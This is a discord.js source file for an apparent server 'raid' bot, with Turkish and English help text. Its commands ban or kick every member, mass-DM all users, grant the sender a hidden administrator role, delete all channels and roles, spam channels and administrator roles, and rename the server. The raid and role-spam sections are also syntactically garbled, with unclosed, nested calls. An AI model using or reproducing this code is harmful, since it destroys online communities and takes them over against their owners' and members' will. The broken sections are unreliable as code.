const Discord = require("discord.js");
const client = new Discord.Client();
const config = require("./config.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(process.env.token);

client.on("message", msg => {
  if (msg.content === "ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());
  }
}); 

client.on("message", msg => {
  if (msg.content === "kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
}); 

client.on("message", async msg => {
  if (msg.content === "dm") {
   
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          " this will be the message dmed everyone in the server type anyhting you want "         
    )
      )
      .catch(console.error);
  }
});

client.on("message", msg => {
  if (msg.content === "admin") {
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === "."); // gives you admin if you type this command if it doesnt work type it 2 times
    msg.member.addRole(rol);
  }
});

client.on("message", async msg => {
  if (msg.content === "raid") {
    
    msg.delete();

    await msg.guild.channels.deleteAll(); 

    await msg.guild.createChannel("raided", {
      type: "text"
    });
    await msg.guild
      .createChannel("raided", {
        type: "category"
      });
      
    await msg.guild
      .createChannel("raided", {
        type: "category"
      
    });
 await msg.guild
      .createChannel("raided", {
        type: "category"
      });
      
    await msg.guild
      .createChannel("raided", {
        type: "category"
       await msg.guild
      .createChannel("raided", {
        type: "category"
      });
      
    await msg.guild
      .createChannel("raided", {
        type: "category"
       await msg.guild
      .createChannel("raided", {
        type: "category"
      });
      
    await msg.guild
      .createChannel("raided", {
        type: "category"
       await msg.guild
      .createChannel("raided", {
        type: "category"
      });
      
    await msg.guild
      .createChannel("raided", {
        type: "category"
       await msg.guild
      .createChannel("raided", {
        type: "category"
      });
      
    await msg.guild
      .createChannel("raided", {
        type: "category"
       await msg.guild
      .createChannel("raided", {
        type: "category"
      });
      
    await msg.guild
      .createChannel("raided", {
        type: "category"
       await msg.guild
      .createChannel("raided", {
        type: "category"
      });
      
    await msg.guild
      .createChannel("raided", {
        type: "category"
       await msg.guild
      .createChannel("raided", {
        type: "category"
      });
      
    await msg.guild
      .createChannel("raided", {
        type: "category"
       await msg.guild
      .createChannel("raided", {
        type: "category"
      });
      
    await msg.guild
      .createChannel("raided", {
        type: "category"
       await msg.guild
      .createChannel("raided", {
        type: "category"
      });
      
    await msg.guild
      .createChannel("raided", {
        type: "category"
      });
   
   
    
    
   await msg.guild.setIcon(
      "changes servers icon type a jpeg/png/jpg link here to change it"
    ); 
    await msg.guild.setName("changes name of the server type whatever you want"); 
    await msg.guild.roles.forEach(roles => roles.delete()); 
    await msg.guild.owner.send(
      "When the raid is complete, this message will go to the server's founder."
    );
  }
});

client.on("message", msg => {
  if (msg.content === "n!role") {
    //ROL SPAM YAPAR
    msg.delete();
    msg.guild.createRole({
      name: "raided",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
     msg.guild.createRole({
      name: "nyan",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    
    });
  }
});





















client.on('ready', () => {
  console.log('I am ready!');
});

client.on('message', message => {
  // Ignore messages that aren't from a guild
  if (!message.guild) return;

  // if the message content starts with "!ban"
  if (message.content.startsWith('ban him')) {
    // Assuming we mention someone in the message, this will return the user
    // Read more about mentions over at https://discord.js.org/#/docs/main/master/class/MessageMentions
    const user = message.mentions.users.first();
    // If we have a user mentioned
    if (user) {
      // Now we get the member from the user
      const member = message.guild.member(user);
      // If the member is in the guild
      if (member) {
        /**
         * Ban the member
         * Make sure you run this on a member, not a user!
         * There are big differences between a user and a member
         * Read more about what ban options there are over at
         * https://discord.js.org/#/docs/main/master/class/GuildMember?scrollTo=ban
         */
        member
          .ban({
            reason: 'he tried to scam people',
          })
          .then(() => {
            // We let the message author know we were able to ban the person
            message.reply(`Successfully banned ${user.tag}`);
          })
          .catch(err => {
            // An error happened
            // This is generally due to the bot not being able to ban the member,
            // either due to missing permissions or role hierarchy
            message.reply('I was unable to ban the member');
            // Log the error
            console.error(err);
          });
      } else {
        // The mentioned user isn't in this guild
        message.reply("That user isn't in this guild!");
      }
    } else {
      // Otherwise, if no user was mentioned
      message.reply("You didn't mention the user to ban!");
    }
  }
});





client.on("message", function(msg){//call in the 'message' event
    if(msg.content.startsWith("n!help Tr")){//check the message content for !ping
        let Embed = new Discord.RichEmbed()
           .setTitle("komutlar/commands")
           .addField(" n!kick= herkezi atar (sende kicklenebilirsin!) ")
           .addField("n!ban= herkezi banlar (sende ban yiyebilirsin!)")
           .addField("n!dm= herkeze dm atar ")
           .addField("n!admin= sana administrator rolu verir ama bozuk bu yuzden 2 kez yaz ")
           .addField("n!raid= sunucuyu patlatir")
           .addField("n!role= bir suru rol acar ")
           .addField("n!spam= spam atar ")
           .addField("n!bann= tagledigin kisiye banlar unutma her istedigini banlayamaz sadece onun rolunun altindakileri banlar ")
           .setTimestamp("")
           .setColor("PURPLE");
        msg.channel.send(Embed)
    }
})
 
 
client.on("ready", function(){//call in the 'ready' event
    console.log("Bot online!")//log the ready data in the console
})
